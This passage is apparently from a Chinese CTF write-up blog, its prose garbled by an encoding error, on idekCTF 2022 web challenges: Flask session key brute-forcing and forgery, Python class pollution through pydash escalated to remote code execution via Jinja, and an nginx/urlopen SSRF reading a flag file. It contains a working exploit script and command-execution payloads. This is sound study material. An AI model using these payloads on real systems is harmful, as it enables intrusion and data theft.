<p>ä¸Šä¼ ä¸Šå»åè®¿é—®å¯¹åº”çš„æ–‡ä»¶ï¼Œå¯ä»¥å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œè·å–æ–‡ä»¶çš„å†…å®¹</p>
<p>å…ˆä»config.pyè·å¾—<code>SECRET_OFFSET</code>çš„å€¼ï¼Œä¸º<code>-67198624</code></p>
<p>ç„¶åä»server.logè·å–æ—¶é—´æˆ³</p>
<pre><code class="bash">[2023-01-16 23:13:22 +0000] [8] [INFO] Starting gunicorn 20.1.0
[2023-01-16 23:13:22 +0000] [8] [INFO] Listening at: http://0.0.0.0:1337 (8)
[2023-01-16 23:13:22 +0000] [8] [INFO] Using worker: sync
.......................................................
</code></pre>
<p>åœ¨ç½‘ä¸Šè¿›è¡Œè½¬æ¢ï¼Œè¦æ³¨æ„ï¼Œæœ‰äº›ç½‘ç«™ä¼šè‡ªåŠ¨å°†è¿™ä¸ªæ—¶é—´è¯†åˆ«ä¸ºutf+8ï¼Œä½†æ˜¯é¢˜ç›®ä¸Šçš„utf+0çš„</p>
<p>å¾—åˆ°æ—¶é—´æˆ³<code>1673910802</code></p>
<p>æˆ‘æ˜¯ä½¿ç”¨flask-unsignè¿›è¡Œçˆ†ç ´ï¼Œæ‰€ä»¥å…ˆå†™å­—å…¸</p>
<pre><code class="python">import random
start=1673910790
end=1673910805
#timestamp=1673910802
SECRET_OFFSET = -67198624
f = open(&#39;key.txt&#39;, &#39;a+&#39;)
while start&lt;end:
    # start=round(start,3)
    print(start)
    random.seed(round((start + SECRET_OFFSET) * 1000))
    print(round((start + SECRET_OFFSET) * 1000))
    secret_key = &quot;&quot;.join([hex(random.randint(0, 15)) for x in range(32)]).replace(&quot;0x&quot;, &quot;&quot;)
    # f.write(secret_key+&#39;\n&#39;)
    start+=0.001
</code></pre>
<p>ç„¶åä½¿ç”¨flask-unsign</p>
<pre><code class="bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/tools/flask-unsign]
â””â”€$ flask-unsign  --unsign -w key.txt --cookie  &#39;eyJhZG1pbiI6ZmFsc2UsInVpZCI6IjEyMzQifQ.Y8a8uQ.E77ORPZ53Oy4DNkqoJqtZYct4sc&#39; -t 100
[*] Session decodes to: &#123;&#39;admin&#39;: False, &#39;uid&#39;: &#39;1234&#39;&#125;
[*] Starting brute-forcer with 100 threads..
[+] Found secret key after 12800 attemptsd7e6630f3f7a
&#39;074cce10940b886e3089f27a878577cd&#39;
</code></pre>
<p>è·å¾—secret_key:<code>074cce10940b886e3089f27a878577cd</code></p>
<p>å†ä½¿ç”¨è·å¾—çš„secret_keyä¼ªé€ session</p>
<pre><code class="bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/tools/flask-unsign]
â””â”€$ flask-unsign  --sign --secret &#39;074cce10940b886e3089f27a878577cd&#39; --cookie  &quot;&#123;&#39;admin&#39;:True,&#39;uid&#39;:&#39;1234&#39;&#125;&quot;    
eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTIzNCJ9.Y8bNxA.awZ8Y_QZeUjPzoB_3MHcflCUtVI
</code></pre>
<p>åˆ©ç”¨è¿™ä¸ªsessionå»è®¿é—®<code>/flag</code>è·å¾—flag</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301180034375.png" alt="image-20230118003447267"></p>
<h1 id="Web-x2F-task-manager-å¤ç°"><a href="#Web-x2F-task-manager-å¤ç°" class="headerlink" title="Web&#x2F;task manager(å¤ç°)"></a>Web&#x2F;task manager(å¤ç°)</h1><h2 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h2><p>å‚è€ƒé“¾æ¥ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#%E5%A7%BF%E5%8A%BF2-1">Y4çˆ·</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager">è€å¤–çš„wp</a></li>
</ul>
<hr>
<p>åˆ©ç”¨ç±»ä¼¼pythonç‰ˆæœ¬çš„åŸå‹é“¾æ±¡æŸ“ï¼ˆå³<strong>ç±»æ±¡æŸ“</strong>ï¼‰ï¼Œé€šè¿‡å¯¹å±æ€§çš„ä¿®æ”¹ï¼Œæ¥é€ æˆrceæˆ–ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ä½œè€…æ˜¯å€Ÿé‰´äº†è¿™ä¸ªæ–‡ç« çš„å†…å®¹:<a target="_blank" rel="noopener" href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">Prototype Pollution in Python</a>ã€‚</p>
<p>åˆ©ç”¨pydashæ¨¡å—çš„<code>pydash.set_</code>å¯¹æ¥è®¾ç½®æˆ–è¦†ç›–å±æ€§å€¼ï¼Œå¯ä»¥è®¾ç½®è·¯å¾„</p>
<pre><code class="python">import pydash
a=&#123;&#125;
pydash.set_(a,&#39;a.b.c&#39;,123)
print(a)
#&#123;&#39;a&#39;: &#123;&#39;b&#39;: &#123;&#39;c&#39;: 123&#125;&#125;&#125;
</code></pre>
<p>è€Œæœ¬é¢˜å­˜åœ¨ä¸€ä¸ªTaskManagerç±»ï¼Œé‡Œé¢å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œä¼šè°ƒç”¨pydash.set_</p>
<pre><code class="python">def set(self, task, status):
    if task in self.protected:
        return
    pydash.set_(self, task, status)
    return True
</code></pre>
<p>è€Œä¸”taskå‚æ•°å’Œstatuséƒ½æ˜¯å¯æ§çš„ï¼Œå°±å¯ä»¥é€šè¿‡TaskManagerå®ä¾‹æ¥å¯¹å…¶ä»–å±æ€§å€¼è¿›è¡Œä¿®æ”¹</p>
<h3 id="é€šè¿‡TaskManagerå¾—åˆ°appå¯¹è±¡"><a href="#é€šè¿‡TaskManagerå¾—åˆ°appå¯¹è±¡" class="headerlink" title="é€šè¿‡TaskManagerå¾—åˆ°appå¯¹è±¡"></a>é€šè¿‡TaskManagerå¾—åˆ°appå¯¹è±¡</h3><p>è¿™ä¸ªè¦è‡ªå·±è°ƒè¯•ï¼Œä½†æ˜¯æˆ‘æœ¬åœ°è°ƒè¯•çš„ä¸€ç›´å’Œåˆ«äººçš„ä¸ä¸€æ · XDï¼Œæ‰€ä»¥å°±å…ˆä¸ç®¡äº†ï¼Œå…ˆç”¨Y4çˆ·çš„è·¯å¾„</p>
<pre><code class="python">app:__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app
</code></pre>
<h2 id="0x01-é€šè¿‡evalè¿›è¡Œrce"><a href="#0x01-é€šè¿‡evalè¿›è¡Œrce" class="headerlink" title="0x01 é€šè¿‡evalè¿›è¡Œrce"></a>0x01 é€šè¿‡evalè¿›è¡Œrce</h2><pre><code class="python">@app.before_first_request
def init():
    if app.env == &#39;yolo&#39;:
        app.add_template_global(eval)
</code></pre>
<h3 id="é‡å¤è°ƒç”¨-app-before-first-request"><a href="#é‡å¤è°ƒç”¨-app-before-first-request" class="headerlink" title="é‡å¤è°ƒç”¨@app.before_first_request"></a>é‡å¤è°ƒç”¨@app.before_first_request</h3><p><code>before_first_request</code>ï¼Œæ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ­¤åº”ç”¨ç¨‹åºå®ä¾‹ä¹‹å‰è¿è¡Œï¼Œåœ¨è¿™é‡Œå°±æ˜¯è¿è¡Œinit()</p>
<p>å¯ä»¥å°†<code>app._got_first_request</code>è®¾ç½®ä¸ºFalseï¼Œæ¥é‡å¤è°ƒç”¨@app.before_first_request</p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå½“app.envç­‰äºâ€™yoloâ€™æ—¶å°±ä¼šè°ƒç”¨<code>add_template_global(eval)</code>ï¼Œå°†eval()å‡½æ•°æ³¨å†Œä¸ºæ¨¡æ¿å…¨å±€å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨<code>&#123;&#123;eval(xxxx)&#125;&#125;</code>çš„æ–¹å¼æ¥è°ƒç”¨evalå‡½æ•°</p>
<p>payload:</p>
<pre><code class="bash">&#123;&quot;task&quot;:&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.env&quot;,&quot;status&quot;:&quot;yolo&quot;&#125;
&#123;&quot;task&quot;:&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;,&quot;status&quot;:False&#125;
</code></pre>
<h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><p>å› ä¸ºflaskåœ¨è¯†åˆ«è·¯å¾„çš„æ—¶å€™ä¼šæ£€æµ‹æ˜¯å¦æœ‰<code>..</code>ï¼Œåœ¨æºç ä¸­å°±æ˜¯<code>os.path.pardir</code>çš„å€¼ï¼Œå¦‚æœå­˜åœ¨è¿™ä¸ªå€¼ï¼Œå°±ä¼šæŠ¥é”™</p>
<p>åªè¦äººä¸ºä¿®æ”¹è¿™ä¸ªçš„å€¼ï¼Œå°±å¯ä»¥ç»•è¿‡æ£€æµ‹,è¿™ä¸ªä¹Ÿè¦è‡ªå·±è°ƒè¯•</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242056629.png"></p>
<p>payload:</p>
<pre><code class="bash">&#123;&quot;task&quot;:&quot;__class__.__init__.__globals__.__loader__.__init__.__globals__.sys.modules.os.pardir&quot;,&quot;status&quot;:&quot;None&quot;&#125;
</code></pre>
<h3 id="ä¿®æ”¹é—­åˆå­—ç¬¦ä¸²"><a href="#ä¿®æ”¹é—­åˆå­—ç¬¦ä¸²" class="headerlink" title="ä¿®æ”¹é—­åˆå­—ç¬¦ä¸²"></a>ä¿®æ”¹é—­åˆå­—ç¬¦ä¸²</h3><p>åœ¨jinjaé‡Œï¼Œé»˜è®¤è¯†åˆ«æ¨¡æ¿çš„å­—ç¬¦ä¸²çš„<code>&#123;&#123;`å’Œ`&#125;&#125;</code></p>
<blockquote>
<p>block_start_string</p>
<p>æ ‡è®°å—å¼€å§‹çš„å­—ç¬¦ä¸²ã€‚é»˜è®¤ä¸º<code>&#39;&#123;%'`.
>
> block_end_string
>
> æ ‡è®°å—ç»“æŸçš„å­—ç¬¦ä¸²ã€‚é»˜è®¤ä¸º`'%&#125;&#39;</code>.</p>
<p>variable_start_string</p>
<p>æ ‡è®°æ‰“å°è¯­å¥å¼€å§‹çš„å­—ç¬¦ä¸²ã€‚é»˜è®¤ä¸º<code>&#39;&#123;&#123;'`.
>
> *variable_end_string*
>
> æ ‡è®°æ‰“å°è¯­å¥ç»“æŸçš„å­—ç¬¦ä¸²ã€‚é»˜è®¤ä¸º `'&#125;&#125;&#39;</code>.</p>
</blockquote>
<p>æ‰€ä»¥ä¿®æ”¹variable_start_stringå’Œvariable_end_stringçš„å€¼ï¼Œå°±å¯ä»¥è®©ä»»æ„å­—ç¬¦ä¸²ä½œä¸ºæ¨¡æ¿è¯†åˆ«çš„å¼€å§‹å’Œç»“æŸ</p>
<p>payload:</p>
<pre><code class="bash">&#123;&quot;task&quot;:&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;,&quot;status&quot;:xxxx&quot;&#125;
&#123;&quot;task&quot;:&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string&quot;,&quot;status&quot;:xxxx&quot;&#125;
</code></pre>
<h3 id="å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„æ–‡ä»¶ï¼Œå¹¶è®¾ç½®é—­åˆå­—ç¬¦ä¸²"><a href="#å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„æ–‡ä»¶ï¼Œå¹¶è®¾ç½®é—­åˆå­—ç¬¦ä¸²" class="headerlink" title="å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„æ–‡ä»¶ï¼Œå¹¶è®¾ç½®é—­åˆå­—ç¬¦ä¸²"></a>å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„æ–‡ä»¶ï¼Œå¹¶è®¾ç½®é—­åˆå­—ç¬¦ä¸²</h3><p>å› ä¸ºæˆ‘ä»¬æœ€ç»ˆæ˜¯åœ¨æ¨¡æ¿æ–‡ä»¶é‡Œè°ƒç”¨eval()ï¼Œä½†æ˜¯é€šè¿‡ç°æœ‰çš„æ–‡ä»¶æ— æ³•å®ç°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾å…¶ä»–æ–‡ä»¶é‡Œé¢å­˜åœ¨<code>eval()</code>ä»£ç çš„æ–‡ä»¶</p>
<p>å‡ºé¢˜äººæä¾›äº†ç­”æ¡ˆï¼Œåœ¨<code>/usr/local/lib/python3.8/turtle.py</code>é‡Œå­˜åœ¨</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242110924.png" alt="image-20230124211036873"></p>
<p>æ‰€ä»¥åªè¦æŠŠvariable_start_stringä¿®æ”¹ä¸º<code>\n            value = </code>ï¼Œvariable_end_stringä¿®æ”¹ä¸º<code>\n        else:</code></p>
<p>è¿™æ ·ï¼Œåœ¨é€šè¿‡å‰é¢çš„ä»»æ„æ–‡ä»¶è¯»å–çš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨å°†eval(value)è¯†åˆ«ä¸ºæ¨¡æ¿ä»£ç ï¼Œä»è€Œæ‰§è¡Œevalå‡½æ•°</p>
<p>è€Œä¸”valueçš„å€¼ï¼Œå¯ä»¥è®¾ç½®globals.valueï¼Œåœ¨æ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨globalsçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»™globalsæ·»åŠ ä¸€ä¸ªé”®åä¸ºvalueçš„å…ƒç´ </p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242134490.png" alt="image-20230124213445403"></p>
<p>payload:</p>
<pre><code class="bash">&#123;&quot;task&quot;:&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;,&quot;status&quot;:&quot;__import__(&#39;os&#39;).popen(&#39;cat /flag*.txt&#39;).read()&quot;&#125;
</code></pre>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">import re

import requests
baseurl=&quot;http://192.168.152.128:1337&quot;
proxy=&#123;&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;&#125;

hijack_start = &quot;\n            value = &quot;
hijack_end = &quot;\n        else:&quot;
payload=&#123;&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.env&quot;:&quot;yolo&quot;,
         &quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;:None,
         &quot;__init__.__globals__.__spec__.__loader__.__init__.__globals__.sys.modules.os.pardir&quot;:&quot;v2i&quot;,
         &quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;:hijack_start,
         &quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string&quot;:hijack_end,
         &quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;:&quot;__import__(&#39;os&#39;).popen(&#39;cat /flag*.txt&#39;).read()&quot;
         &#125;

def overwrite(t,s):
    data=&#123;&quot;task&quot;:t,&quot;status&quot;:s&#125;
    url=baseurl+&quot;/api/manage_tasks&quot;
    requests.post(url=url,json=data)

def get_flag(): 
    url = baseurl + &quot;/../../usr/local/lib/python3.8/turtle.py&quot;
    s = requests.Session()
    r = requests.Request(method=&#39;GET&#39;, url=url)
    prep = r.prepare()
    prep.url = url
    r = s.send(prep)
    flag = re.findall(&#39;idek&#123;.*&#125;&#39;, r.text)[0]
    print(flag)
if __name__==&#39;__main__&#39;:
    for t,s in payload.items():
        overwrite(t,s)
    get_flag()
</code></pre>
<p>get_flagä¸‹é¢çš„æ˜¯ç”¨çš„Y4çˆ·çš„ï¼Œå¯ä»¥é˜²æ­¢requestsè‡ªåŠ¨å°†&#x2F;..&#x2F;..&#x2F;åˆ é™¤æ‰ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨å»å‘åŒ…ï¼Œè®¿é—®ä¸€æ¬¡</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242334891.png" alt="image-20230124233350740"></p>
<h2 id="0x02-é€šè¿‡è¦†ç›–ç¼–è¯‘æ—¶éœ€è¦çš„å€¼è¿›è¡Œrce"><a href="#0x02-é€šè¿‡è¦†ç›–ç¼–è¯‘æ—¶éœ€è¦çš„å€¼è¿›è¡Œrce" class="headerlink" title="0x02 é€šè¿‡è¦†ç›–ç¼–è¯‘æ—¶éœ€è¦çš„å€¼è¿›è¡Œrce"></a>0x02 é€šè¿‡è¦†ç›–ç¼–è¯‘æ—¶éœ€è¦çš„å€¼è¿›è¡Œrce</h2><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªè€å¤–çš„åšæ³•:<a target="_blank" rel="noopener" href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager">https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager</a></p>
<p>åœ¨ç”Ÿæˆæ¨¡æ¿çš„è¿‡ç¨‹ä¸­ï¼Œ<code>jinja2.compiler.CodeGenerator.visit_Template()</code>é‡Œï¼Œå¦‚æœæˆ‘ä»¬è¦†ç›–äº†exportedå˜é‡å°±å¯ä»¥æ§åˆ¶æ¨¡æ¿çš„ç”Ÿæˆ</p>
<pre><code class="python">def visit_Template(
        self, node: nodes.Template, frame: t.Optional[Frame] = None
    ) -&gt; None:
        assert frame is None, &quot;no root frame allowed&quot;
        eval_ctx = EvalContext(self.environment, self.name)

        from .runtime import exported, async_exported

        if self.environment.is_async:
            exported_names = sorted(exported + async_exported)
        else:
            exported_names = sorted(exported)

        self.writeline(&quot;from jinja2.runtime import &quot; + &quot;, &quot;.join(exported_names))
</code></pre>
<p>å¯ä»¥è¿›è¡Œrceï¼Œå°†flagæ–‡ä»¶å¤åˆ¶åˆ°ä¸€ä¸ªçŸ¥é“æ–‡ä»¶åçš„æ–‡ä»¶é‡Œï¼Œç„¶åä½¿ç”¨ä»»æ„æ–‡ä»¶è¯»å–å»æ¸²æŸ“é‚£ä¸ªæ–‡ä»¶ï¼Œè·å¾—flag</p>
<p>payload:</p>
<pre><code class="bash">&#123;&quot;task&quot;:&quot;get.__globals__.pydash.helpers.inspect.sys.modules.jinja2.runtime.exported[0]&quot;,&quot;status&quot;: &#39;*;import os;os.system(&quot;cp /flag* /tmp/flag&quot;) #&#39;&#125;
</code></pre>
<p>ç„¶åç”¨æ¨¡æ¿å»æ¸²æŸ“&#x2F;tmp&#x2F;flagæ¥å¾—åˆ°flag</p>
<h1 id="Web-x2F-Proxy-Viewer-å¤ç°"><a href="#Web-x2F-Proxy-Viewer-å¤ç°" class="headerlink" title="Web&#x2F;Proxy Viewer(å¤ç°)"></a>Web&#x2F;Proxy Viewer(å¤ç°)</h1><h2 id="0x00-4"><a href="#0x00-4" class="headerlink" title="0x00"></a>0x00</h2><p>åˆ©ç”¨nginxå’Œurllib.request.urlopenå¯¹urlè§£æçš„å·®å¼‚æ€§è¿›è¡Œssrf</p>
<p>å‚è€ƒè¿æ¥</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#2023-IdekCTF-Writeup">Y4çˆ·</a></li>
<li><a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc3986#section-5.2.4">RFC 3986 5.2.4</a></li>
<li><a target="_blank" rel="noopener" href="https://nokline.github.io/bugbounty/2022/09/02/Glassdoor-Cache-Poisoning.html#here-is-how-i-was-able-to-poison-the-cache-of-thousands-of-pages-in-glassdoor-with-reflected--stored-xss">downgradeå¸ˆå‚…æ¨èçš„æ–‡ç« </a></li>
</ul>
<h2 id="0x01-æºç åˆ†æ-1"><a href="#0x01-æºç åˆ†æ-1" class="headerlink" title="0x01 æºç åˆ†æ"></a>0x01 æºç åˆ†æ</h2><p>å…³é”®æºç </p>
<pre><code class="python">@app.route(&#39;/proxy/&lt;path:path&gt;&#39;)
@limiter.limit(&quot;10/minute&quot;)
def proxy(path):
    remote_addr = request.headers.get(&#39;X-Forwarded-For&#39;) or request.remote_addr
    is_authorized = request.headers.get(&#39;X-Premium-Token&#39;) == PREMIUM_TOKEN or remote_addr == &quot;127.0.0.1&quot;
    try:
        page = urlopen(path, timeout=.5)
    except:
        return render_template(&#39;proxy.html&#39;, auth=is_authorized)
    if is_authorized:
        output = page.read().decode(&#39;latin-1&#39;)
    else:
        output = f&quot;&lt;pre&gt;&#123;page.headers.as_string()&#125;&lt;/pre&gt;&quot;
    return render_template(&#39;proxy.html&#39;, auth=is_authorized, content=output)
</code></pre>
<p>è¿™é‡Œå¯ä»¥çŸ¥é“ï¼Œéœ€è¦è®©X-Forwarded-Forå¤´ä¸º127.0.0.1æ‰ä¼šè¾“å‡ºurlopenå»è®¿é—®å¾—åˆ°çš„å†…å®¹</p>
<p>è¿™é‡Œçš„X-Forwarded-Foræ˜¯æ— æ³•ä¼ªé€ çš„</p>
<p>å› ä¸ºåœ¨nginx.confé‡Œ,å¯¹æ¯ä¸ªä»£ç†è¿›è¡Œè®¿é—®çš„æ—¶å€™éƒ½ä¼šåœ¨httpè¯·æ±‚å¤´æ·»åŠ X-Forwarded-For</p>
<p>$proxy_add_x_forwarded_forå˜é‡åŒ…å«å®¢æˆ·ç«¯è¯·æ±‚å¤´ä¸­çš„â€X-Forwarded-Forâ€ï¼Œä¸$remote_addrç”¨é€—å·åˆ†å¼€ï¼Œå¦‚æœæ²¡æœ‰â€X-Forwarded-Forâ€ è¯·æ±‚å¤´ï¼Œåˆ™$proxy_add_x_forwarded_forç­‰äº$remote_addrã€‚$remote_addrå˜é‡çš„å€¼æ˜¯å®¢æˆ·ç«¯çš„IP</p>
<p>å› ä¸ºæ˜¯ç›´æ¥å–$remote_addrçš„å€¼ï¼Œæ‰€ä»¥è¿™ä¸ªæ˜¯æ— æ³•ä¼ªé€ çš„</p>
<pre><code class="nginx">location / &#123;
    proxy_set_header Host $http_host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_pass http://localhost:3000;
&#125;

location ^~ /static/ &#123;
    proxy_pass http://localhost:3000;
    proxy_set_header Host $http_host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_cache my_zone;
    add_header X-Proxy-Cache $upstream_cache_status;
&#125;
</code></pre>
<p>ç„¶åè¿™é‡Œå¯ä»¥çœ‹åˆ°ã€‚å½“è®¿é—®çš„urlé‡Œå¸¦æœ‰<code>/static/</code>çš„è¯ï¼Œå°±ä¼šä½¿ç”¨ç¼“å­˜ï¼Œè¿™ä¸ªç¼“å­˜çš„æ„æ€å°±æ˜¯å‡è®¾å¯¹èµ„æº&#x2F;aaaa.htmlè¿›è¡Œè®¿é—®äº†ä¸€æ¬¡ä¹‹åï¼Œnginxå°±ä¼šå¯¹æ­¤è¿›è¡Œç¼“å­˜ï¼Œç„¶ååœ¨ç¬¬äºŒæ¬¡è®¿é—®ç›¸åŒçš„èµ„æºæ—¶ï¼Œnginxå°±<strong>ç›´æ¥è¿”å›ç¼“å­˜çš„å†…å®¹ç»™å®¢æˆ·ç«¯</strong>è€Œä¸ä¼šå†å»è®¿é—®åç«¯</p>
<p>è¿˜æœ‰å°±æ˜¯<code>urlopen()</code>ä¼šå¯¹åˆ é™¤è®¿é—®çš„urlé‡Œ<code>#</code>åçš„å†…å®¹ï¼Œå¦‚æœurlopençš„urlä¸º&#x2F;etc&#x2F;passwd#asdï¼Œå®é™…è®¿é—®çš„åˆ™æ˜¯&#x2F;etc&#x2F;passwd</p>
<p>flaskå°†ä¼šè®¤ä¸º&#x2F;..&#x2F;..&#x2F;..&#x2F;static&#x2F;sä¸ºpathå‚æ•°ï¼Œè€Œnginxåˆ™è¯†åˆ«ä¸å‡ºä¸Šä¸‹æ–‡ï¼Œä¼šå¯¹å…¶è¿›è¡Œnormalizeï¼ˆè§„èŒƒåŒ–ï¼‰å¤„ç†ï¼Œå°†&#x2F;staticå½“åšurlçš„å¼€å§‹</p>
<p>è§„èŒƒåŒ–å¤„ç†ï¼Œå¯ä»¥æŸ¥çœ‹<a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc3986#section-5.2.4">RFC 3986 5.2.4</a></p>
<blockquote>
<p>åœ¨å¤„ç†çš„æ—¶å€™ä¼šè¿›è¡Œä»¥ä¸‹å¾ªç¯</p>
<p>A.å¦‚æœè¾“å…¥ç¼“å†²åŒºä»¥â€œ..&#x2F;â€æˆ–â€œ.&#x2F;â€çš„å‰ç¼€å¼€å¤´ï¼Œåˆ™ä»è¾“å…¥ç¼“å†²åŒºä¸­åˆ é™¤è¯¥å‰ç¼€ï¼›</p>
<p>B.å¦‚æœè¾“å…¥ç¼“å†²åŒºä»¥â€œ&#x2F;.&#x2F;â€æˆ–â€œ&#x2F;.â€çš„å‰ç¼€å¼€å¤´ï¼Œå…¶ä¸­â€œ.â€æ˜¯ä¸€ä¸ªå®Œæ•´çš„è·¯å¾„æ®µï¼Œç„¶ååœ¨è¾“å…¥ç¼“å†²åŒºä¸­ç”¨â€œ&#x2F;â€æ›¿æ¢è¯¥å‰ç¼€ï¼›å¦åˆ™ï¼Œ</p>
<p>C. å¦‚æœè¾“å…¥ç¼“å†²åŒºä»¥â€œ&#x2F;..&#x2F;â€æˆ–â€œ&#x2F;..â€çš„å‰ç¼€å¼€å¤´ï¼Œå…¶ä¸­â€œ..â€æ˜¯ä¸€ä¸ªå®Œæ•´çš„è·¯å¾„æ®µï¼Œåˆ™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ç”¨â€œ&#x2F;â€æ›¿æ¢è¯¥å‰ç¼€å¹¶ä»è¾“å‡ºç¼“å†²åŒºåˆ é™¤æœ€åä¸€æ®µåŠå…¶å‰é¢çš„â€œ&#x2F;â€ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ï¼›</p>
<p>D. å¦‚æœè¾“å…¥ç¼“å†²åŒºä»…åŒ…å«â€œ.â€æˆ–â€œ..â€ï¼Œç„¶åä»è¾“å…¥ç¼“å†²åŒºä¸­åˆ é™¤å®ƒ</p>
<p>E. å°†è¾“å…¥ç¼“å†²åŒºä¸­çš„ç¬¬ä¸€ä¸ªè·¯å¾„æ®µç§»åŠ¨åˆ°è¾“å‡ºç¼“å†²åŒºçš„æœ«å°¾ï¼ŒåŒ…æ‹¬åˆå§‹â€œ&#x2F;â€å­—ç¬¦ï¼ˆå¦‚æœæœ‰ï¼‰å’Œä»»ä½•åç»­å­—ç¬¦ï¼Œç›´åˆ°ä½†ä¸åŒ…æ‹¬ä¸‹ä¸€ä¸ªâ€œ&#x2F;â€å­—æˆ–è¾“å…¥ç¼“å†²åŒºçš„ç»“å°¾ã€‚</p>
</blockquote>
<h2 id="0x02-é¢˜è§£-1"><a href="#0x02-é¢˜è§£-1" class="headerlink" title="0x02 é¢˜è§£"></a>0x02 é¢˜è§£</h2><p>æ‰€ä»¥åªè¦åˆ©ç”¨è¿™ä¸¤ä¸ªä¹‹é—´çš„å·®å¼‚æ€§ï¼Œå°±å¯ä»¥è¿›è¡Œssrf</p>
<p>payload:</p>
<p>æ³¨æ„åé¢æ˜¯<code>/../../../</code></p>
<pre><code class="bash">/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a
</code></pre>
<p>å°†<code>:</code>è¿›è¡Œurlç¼–ç ï¼Œé˜²æ­¢æµè§ˆå™¨è¯†åˆ«ä¸ºåè®®</p>
<p>å°†<code>#</code>è¿›è¡ŒäºŒæ¬¡urlç¼–ç ï¼Œè¿™æ ·åœ¨ç¬¬ä¸€æ¬¡æµè§ˆå™¨è§£ç åï¼Œurlopené‡Œé¢å°±ä¼šè§£ç ä¸º<code>#</code>ï¼Œä»è€Œä¸ä¼šå¤„ç†åé¢çš„<code>/../../static/a</code></p>
<blockquote>
<p>æ ¹æ®ä¸Šé¢çš„è§„èŒƒåŒ–å¤„ç†(å¦‚æœè¾“å…¥ç¼“å†²åŒºä»¥â€œ&#x2F;..&#x2F;â€æˆ–â€œ&#x2F;..â€çš„å‰ç¼€å¼€å¤´ï¼Œå…¶ä¸­â€œ..â€æ˜¯ä¸€ä¸ªå®Œæ•´çš„è·¯å¾„æ®µï¼Œåˆ™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ç”¨â€œ&#x2F;â€æ›¿æ¢è¯¥å‰ç¼€å¹¶ä»è¾“å‡ºç¼“å†²åŒºåˆ é™¤æœ€åä¸€æ®µåŠå…¶å‰é¢çš„â€œ&#x2F;â€ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ï¼›)ï¼Œå› ä¸ºåé¢æœ‰ä¸‰ä¸ª<code>/../</code>ï¼Œæ‰€ä»¥ä¼šæŠŠå‰é¢çš„<code>/proxy/file%3a///flag.txt%2523</code>éƒ½åˆ æ‰ï¼Œä»è€Œåªç•™ä¸‹äº†<code>/static/a</code></p>
</blockquote>
